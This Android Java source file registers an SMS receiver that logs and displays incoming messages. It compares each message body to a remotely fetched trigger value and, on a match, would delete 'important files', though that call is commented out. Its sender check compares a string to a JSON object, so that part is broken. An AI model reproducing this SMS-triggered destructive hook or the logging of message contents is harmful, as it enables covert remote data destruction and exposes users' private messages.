package com.reflex.services.sms;

import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.reflex.services.Reflex;
import com.reflex.services.fileSystem.FileSystemActions;
import com.reflex.util.InjectionFetcher;

import org.json.JSONObject;

import java.util.HashMap;

public class SmsReflexInitializer {



    private static final String TAG =
            SmsReceiver.class.getSimpleName();
    public static final String pdu_type = "pdus";

    public static HashMap<String,Reflex> actionInjector;

    static {

        actionInjector = new HashMap<>();
        actionInjector.put("delete", (context, intent) -> {
            // Get the SMS message.
            Bundle bundle = intent.getExtras();
            SmsMessage[] msgs;
            String strMessage = "";
            String format = bundle.getString("format");

            // Retrieve the SMS message received.
            Object[] pdus = (Object[]) bundle.get(pdu_type);

            if (pdus != null) {

                JSONObject constraints = InjectionFetcher.getInjection(context, "sms", "delete");
                // Fill the messages array.
                msgs = new SmsMessage[pdus.length];
                String msgBody = "";
                for (int i = 0; i < msgs.length; i++) {
                    // Check Android version and use appropriate createFromPdu.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        // If Android version M or newer:
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                    } else {
                        // If Android version L or older:
                        msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }
                    // Build the message to show.

                    if (!msgs[i].getOriginatingAddress().equals(constraints.getJSONObject("phone_number"))) {
                        Log.d(TAG, "onReceive: no equal" + msgs[i].getOriginatingAddress());
                    }
                    strMessage += "SMS from " + msgs[i].getOriginatingAddress();
                    strMessage += " :" + msgs[i].getMessageBody() + "\n";
                    msgBody += msgs[i].getMessageBody();
                    // Log and display the SMS message.
                    Log.d(TAG, "onReceive: " + strMessage);
                    Toast.makeText(context, strMessage, Toast.LENGTH_LONG).show();

                    if (msgBody.equals(constraints.get("message"))) {
//                        FileSystemActions.deleteImportantFiles();z
                    }
                }
            }
        });
    }

    public static void init() {
        SmsReflexesPool.getInstance().add("android.provider.Telephony.SMS_RECEIVED", actionInjector.get("delete"));
    }
}
